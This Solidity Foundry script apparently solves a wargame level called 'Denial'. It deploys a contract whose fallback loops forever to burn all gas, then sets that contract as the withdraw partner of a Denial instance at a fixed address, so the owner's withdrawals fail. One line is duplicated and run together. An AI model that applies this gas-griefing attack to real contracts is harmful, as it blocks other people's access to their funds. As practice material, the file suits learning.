// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "src/20-Denial.sol"; 

contract Exploit {
    fallback() external payable {
        while (true) {}  // 消耗所有 gas
    }
}

contract Exp is Script {

    Denial public DenialInstance = Denial(payable(0xecd9D866218810a8f14E0541AD91e45187E74703));
    address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
    address owner = vm.envAddress("MY_ADDRESS"); 
    Exploit public attackContract;

    function attack() public {
        attackContract = new Exploit();
        attackContract = new Exploit();DenialInstance.setWithdrawPartner(address(attackContract));
        console.log("Attack contract set as partner!");
        
    }
    function run() external {
        vm.startBroadcast(hacker);
        attack();
        vm.stopBroadcast();
        }
}